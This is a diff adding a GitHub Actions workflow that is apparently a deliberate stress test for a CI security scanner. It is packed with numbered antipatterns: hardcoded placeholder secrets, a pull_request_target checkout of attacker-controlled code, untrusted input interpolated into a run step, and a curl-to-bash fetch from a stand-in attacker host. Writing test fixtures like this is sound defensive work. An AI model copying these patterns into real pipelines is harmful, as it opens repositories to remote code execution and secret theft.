@@ -1,0 +1,62 @@
+# Deliberate kitchen-sink of CI/CD security antipatterns.
+# Every finding LGTM emits on this file is a passing stress test.
+# DO NOT COPY.
+name: stress-security-test
+
+on:
+  push:
+    branches: [main]
+  pull_request_target:            # rule 4 — pull_request_target
+    types: [opened, synchronize]
+  workflow_dispatch:
+    inputs:
+      target:                      # rule 10 — workflow_dispatch input without type
+        description: "target env"
+        default: "prod"
+
+permissions: write-all            # rule 8 — top-level permissions write-all
+
+jobs:
+  bad-job:
+    runs-on: ubuntu-latest
+    # NOTE: no `permissions:` block on this job even though it uses
+    # secrets + GITHUB_TOKEN below. Rule 9.
+    steps:
+      # rule 6 — actions/checkout pinned by tag not SHA
+      # rule 4 — checkout with attacker-controlled ref (pull_request_target + head.ref)
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+
+      # rule 7 — third-party action pinned by tag not SHA
+      - uses: tj-actions/changed-files@v41
+
+      # rule 1 — hardcoded secrets (multiple patterns)
+      - name: leak secrets
+        env:
+          AWS_KEY: "AKIAIOSFODNN7EXAMPLE"
+          STRIPE_KEY: "sk_live_51EXAMPLEXXXXXXXXXXXXXXXXXXXXXXXXXX"
+          GITHUB_TOKEN: "ghp_wWFRoTNaExamplekEyabcdefghijklmnopqrstuvwx"
+        run: |
+          echo "AWS_KEY=$AWS_KEY" > .env
+          echo "api_key = 'sk-shouldNeverBeInline12345678901234567890'" >> .env
+          # rule 3 — untrusted github.event.* interpolated into run
+          echo "PR title was: ${{ github.event.pull_request.title }}"
+          # rule 16 — pipe curl to bash from an unallowlisted domain
+          curl -s https://attacker.example.com/install.sh | bash
+
+      # rule 11 — external reusable workflow (outside our org)
+  external-caller:
+    uses: some-random-org/setup/.github/workflows/deploy.yml@v1
+
+  privileged:
+    runs-on: ubuntu-latest
+    container:
+      image: alpine:3
+      options: --privileged        # rule 2 — privileged container
+
+  # rule 5 — self-hosted runner on a public repo (lgtm-audit IS public)
+  self-hosted-job:
+    runs-on: [self-hosted, linux, x64]
+    steps:
+      - run: echo "on a self-hosted runner"
